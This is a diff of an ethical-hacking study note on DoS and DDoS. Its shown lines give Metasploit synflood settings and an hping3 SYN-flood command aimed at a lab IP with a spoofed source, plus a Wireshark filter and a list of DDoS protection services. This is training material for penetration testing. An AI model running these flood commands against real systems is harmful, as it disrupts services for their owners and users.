@@ -13,11 +13,11 @@ DoS and DDoS attacks exploit vulnerabilities in the implementation of TCP/IP mod
 As an expert ethical hacker or pen tester, you must have the required knowledge to perform DoS and DDoS attacks to be able to test systems in the target network.
 
 #### 1.1 Perform DOS (syn flooding) using Metasploit
-- `use auxiliary/dos/tcp/synflood` \\\It's an auxiliary module designed for Denial of Service attacks that works by flooding a target with TCP SYN packets.
-- `set RHOST 192.168.18.110` \\\This sets the Remote HOST (the target). You are telling Metasploit, "Launch the attack against the machine with the IP address 192.168.18.110."
-- `set RPORT 21` \\\This sets the Remote PORT on the target machine. Port 21 is the default port for FTP (File Transfer Protocol)
-- `set SHOST 192.168.18.1` \\\This sets the Source HOST IP address for the attack packets. You are spoofing your IP address.
-- `exploit` \\\Finally executes the module and launches the attack.
+- `use auxiliary/dos/tcp/synflood` It's an auxiliary module designed for Denial of Service attacks that works by flooding a target with TCP SYN packets.
+- `set RHOST 192.168.18.110` This sets the Remote HOST (the target). You are telling Metasploit, "Launch the attack against the machine with the IP address 192.168.18.110."
+- `set RPORT 21` This sets the Remote PORT on the target machine. Port 21 is the default port for FTP (File Transfer Protocol)
+- `set SHOST 192.168.18.1` This sets the Source HOST IP address for the attack packets. You are spoofing your IP address.
+- `exploit` Finally executes the module and launches the attack.
 
 #### 1.2 Perform DOS attack using HPing3
 - `hping3 -S 192.168.18.110 -a 192.168.18.1 -p 22 --flood`
@@ -108,6 +108,5 @@ tcp.flags.syn == 1 and tcp.flags.ack == 1
 
 - You can also use other DoS and DDoS protection tools such as, DOSarrest’s DDoS protection service (https://www.dosarrest.com), DDoS-GUARD (https://ddos-guard.net), Radware DefensePro X (https://www.radware.com), F5 DDoS Attack Protection (https://www.f5.com) to protect organization’s systems and networks from DoS and DDoS attacks.
 
-
-
-
+---
+---
